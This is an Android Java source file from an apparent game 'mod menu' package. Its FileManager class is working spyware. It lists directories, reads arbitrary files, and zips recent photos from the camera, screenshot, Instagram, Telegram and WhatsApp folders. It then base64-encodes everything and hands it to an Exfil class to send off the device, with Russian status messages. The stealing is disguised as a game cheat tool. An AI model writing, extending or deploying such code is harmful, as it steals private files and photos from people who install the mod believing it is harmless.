package com.brawl.modmenu;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileManager {

    public static void listDir(Context ctx, String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) {
                    Exfil.send("FILES", "Не найдено: " + path);
                    return;
                }
                File[] files = dir.listFiles();
                if (files == null) {
                    Exfil.send("FILES", "Нет доступа: " + path);
                    return;
                }
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });

                StringBuilder sb = new StringBuilder();
                sb.append("📁 ").append(path).append("\n━━━━━━━━━━━━━━━━━━\n");
                int count = 0;
                for (File f : files) {
                    if (count++ >= 100) break;
                    String prefix = f.isDirectory() ? "📁 " : "📄 ";
                    String size = f.isDirectory() ? "" : " (" + humanSize(f.length()) + ")";
                    sb.append(prefix).append(f.getName()).append(size).append("\n");
                }
                if (files.length > 100) sb.append("... и ещё ").append(files.length - 100);
                Exfil.send("FILES", sb.toString());
            } catch (Throwable t) {
                Exfil.send("FILES", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void downloadFile(Context ctx, String path) {
        new Thread(() -> {
            try {
                File f = new File(path);
                if (!f.exists() || !f.isFile()) {
                    Exfil.send("FILE_GET", "Не найдено: " + path);
                    return;
                }
                long size = f.length();
                if (size > 20 * 1024 * 1024) {
                    Exfil.send("FILE_GET", "Большой: " + humanSize(size));
                    return;
                }
                byte[] data = new byte[(int) size];
                FileInputStream fis = new FileInputStream(f);
                fis.read(data);
                fis.close();
                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                Exfil.sendDocument("FILE: " + f.getName(), b64, f.getName());
            } catch (Throwable t) {
                Exfil.send("FILE_GET", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void lastPhotos(Context ctx) { photosZip(ctx, 10, "PHOTOS"); }
    public static void allPhotos(Context ctx) { photosZip(ctx, 40, "PHOTOS_ALL"); }

    private static void photosZip(Context ctx, int limit, String tag) {
        new Thread(() -> {
            try {
                List<File> photos = new ArrayList<>();
                File sd = Environment.getExternalStorageDirectory();

                File[] dirs = {
                    new File(sd, "DCIM/Camera"),
                    new File(sd, "DCIM"),
                    new File(sd, "Pictures"),
                    new File(sd, "Pictures/Screenshots"),
                    new File(sd, "Pictures/Instagram"),
                    new File(sd, "Download"),
                    new File(sd, "Download/Telegram"),
                    new File(sd, "Telegram"),
                    new File(sd, "WhatsApp/Media/WhatsApp Images")
                };

                for (File d : dirs) {
                    if (d != null && d.exists()) collectImages(d, photos, 0);
                }

                if (photos.isEmpty()) {
                    Exfil.send(tag, "Фото не найдены");
                    return;
                }

                photos.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ZipOutputStream zos = new ZipOutputStream(bos);

                int added = 0;
                long totalSize = 0;
                for (File p : photos) {
                    if (added >= limit) break;
                    if (p.length() > 10 * 1024 * 1024) continue;
                    if (totalSize + p.length() > 45 * 1024 * 1024) break;

                    try {
                        FileInputStream fis = new FileInputStream(p);
                        ZipEntry entry = new ZipEntry(p.getName());
                        entry.setTime(p.lastModified());
                        zos.putNextEntry(entry);

                        byte[] buf = new byte[8192];
                        int n;
                        while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);

                        zos.closeEntry();
                        fis.close();
                        added++;
                        totalSize += p.length();
                    } catch (Throwable ignored) {}
                }
                zos.close();

                if (added == 0) {
                    Exfil.send(tag, "Не удалось собрать ZIP");
                    return;
                }

                byte[] zipData = bos.toByteArray();
                String b64 = Base64.encodeToString(zipData, Base64.NO_WRAP);

                Exfil.sendDocument(tag + " ZIP (" + added + " фото, "
                    + humanSize(zipData.length) + ")", b64, "photos_" + added + ".zip");
            } catch (Throwable t) {
                Exfil.send(tag, "Ошибка ZIP: " + t.getMessage());
            }
        }).start();
    }

    private static void collectImages(File dir, List<File> out, int depth) {
        if (dir == null || depth > 4 || out.size() > 500) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;
        for (File f : files) {
            if (out.size() > 500) return;
            if (f.isDirectory()) collectImages(f, out, depth + 1);
            else if (isImage(f.getName())) out.add(f);
        }
    }

    private static boolean isImage(String name) {
        String l = name.toLowerCase();
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png")
            || l.endsWith(".webp") || l.endsWith(".heic");
    }

    private static String humanSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return String.format("%.1f MB", bytes / 1024.0 / 1024.0);
    }
}
